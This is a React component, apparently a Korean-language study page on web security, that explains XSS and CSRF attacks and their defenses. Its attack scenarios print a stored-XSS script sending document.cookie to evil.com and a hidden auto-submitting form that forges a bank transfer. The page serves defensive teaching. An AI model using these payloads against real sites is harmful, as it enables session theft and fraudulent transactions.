export default function XSSCSRF() {
    return (
        <article className="w-full h-full flex flex-col justify-center mt-[40px]">
            <p className="text-gray060 heading-xl">XSS & CSRF</p>
            <p className="text-gray060 body-sm mt-[16px]">
                XSS(Cross-Site Scripting)와 CSRF(Cross-Site Request Forgery)는 웹의 대표적인 클라이언트 사이드 공격이다.<br />
                공격 원리를 이해해야 효과적인 방어 코드를 작성할 수 있다.
            </p>

            {/* XSS */}
            <div className="mt-[28px] flex flex-col gap-[6px]">
                <p className="text-blue030 body-md">XSS — 악성 스크립트 삽입</p>
                <div className="mt-[8px] flex flex-col gap-[8px]">
                    <div className="bg-red005 border border-red020 rounded-[8px] p-[12px]">
                        <p className="body-xs text-red050 font-bold mb-[4px]">공격 시나리오</p>
                        <p className="body-xs text-gray060 whitespace-pre-line">{`// 1. 공격자가 악성 스크립트를 댓글/입력창에 삽입
<script>
  document.location = 'https://evil.com?cookie=' + document.cookie
</script>

// 2. 서버가 이를 그대로 저장
// 3. 다른 사용자가 해당 페이지 방문 시 스크립트 실행
// → 세션 쿠키 탈취, 계정 탈취 가능`}</p>
                    </div>
                    <div className="bg-green005 border border-green020 rounded-[8px] p-[12px]">
                        <p className="body-xs text-green060 font-bold mb-[4px]">XSS 방어 전략</p>
                        <p className="body-xs text-gray060 whitespace-pre-line">{`// 1. 입력값 이스케이프 (React는 JSX에서 자동 처리)
// 절대 사용 금지
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// 불가피하게 HTML 렌더링이 필요하면 DOMPurify로 sanitize
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />

// 2. HttpOnly 쿠키 — JS에서 document.cookie 접근 불가
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict

// 3. CSP 헤더 — 스크립트 실행 출처 제한 (다음 토픽 참고)`}</p>
                    </div>
                </div>
            </div>

            {/* CSRF */}
            <div className="mt-[32px] flex flex-col gap-[6px]">
                <p className="text-blue030 body-md">CSRF — 인증된 사용자를 이용한 위조 요청</p>
                <div className="mt-[8px] flex flex-col gap-[8px]">
                    <div className="bg-red005 border border-red020 rounded-[8px] p-[12px]">
                        <p className="body-xs text-red050 font-bold mb-[4px]">공격 시나리오</p>
                        <p className="body-xs text-gray060 whitespace-pre-line">{`// 1. 사용자가 bank.com에 로그인 (세션 쿠키 존재)
// 2. 공격자가 이메일로 evil.com 링크 전송
// 3. 사용자가 클릭하면 evil.com에서 자동으로 요청 전송

// evil.com의 숨겨진 폼
<form action="https://bank.com/transfer" method="POST">
  <input name="amount" value="1000000" />
  <input name="to" value="attacker-account" />
</form>
<script>document.forms[0].submit();</script>

// 4. 브라우저가 쿠키를 자동 포함하여 bank.com에 전송
// → 사용자 의도와 무관하게 송금 실행`}</p>
                    </div>
                    <div className="bg-green005 border border-green020 rounded-[8px] p-[12px]">
                        <p className="body-xs text-green060 font-bold mb-[4px]">CSRF 방어 전략</p>
                        <p className="body-xs text-gray060 whitespace-pre-line">{`// 1. SameSite 쿠키 속성 (가장 효과적)
Set-Cookie: session=abc; SameSite=Strict  // 크로스-사이트 요청 시 쿠키 전송 안 함
Set-Cookie: session=abc; SameSite=Lax     // GET만 허용 (기본값)

// 2. CSRF Token — 서버가 랜덤 토큰을 발급, 요청 시 검증
// 헤더에 포함 (쿠키에 자동 포함되지 않는 방식)
headers: { 'X-CSRF-Token': csrfToken }

// 3. Origin / Referer 헤더 검증 (서버)`}</p>
                    </div>
                </div>
            </div>

            {/* JWT vs 쿠키 */}
            <div className="mt-[32px] flex flex-col gap-[6px]">
                <p className="text-blue030 body-md">인증 토큰 저장 위치 — 보안 관점</p>
                <div className="mt-[8px] flex flex-col gap-[6px]">
                    {[
                        { place: "localStorage", xss: "취약 (JS로 접근 가능)", csrf: "안전", recommend: false },
                        { place: "sessionStorage", xss: "취약 (JS로 접근 가능)", csrf: "안전", recommend: false },
                        { place: "HttpOnly Cookie", xss: "안전 (JS 접근 불가)", csrf: "취약 → SameSite로 방어", recommend: true },
                        { place: "Memory (변수)", xss: "비교적 안전", csrf: "안전", recommend: true },
                    ].map((item) => (
                        <div key={item.place} className={`rounded-[8px] p-[10px] border ${item.recommend ? 'bg-green005 border-green020' : 'bg-gray010 border-gray020'}`}>
                            <p className={`body-xs font-bold ${item.recommend ? 'text-green060' : 'text-gray080'}`}>{item.place} {item.recommend ? '(권장)' : ''}</p>
                            <p className="body-xs text-gray060 mt-[2px]">XSS: {item.xss} / CSRF: {item.csrf}</p>
                        </div>
                    ))}
                </div>
            </div>
        </article>
    )
}
